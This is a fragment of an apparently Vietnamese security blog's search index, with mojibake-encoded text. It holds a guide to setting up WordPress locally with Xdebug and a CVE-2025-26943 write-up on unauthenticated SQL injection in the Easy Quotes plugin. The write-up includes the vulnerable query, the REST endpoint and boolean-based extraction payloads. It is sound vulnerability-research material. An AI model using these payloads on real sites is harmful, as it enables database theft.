Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Báº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c 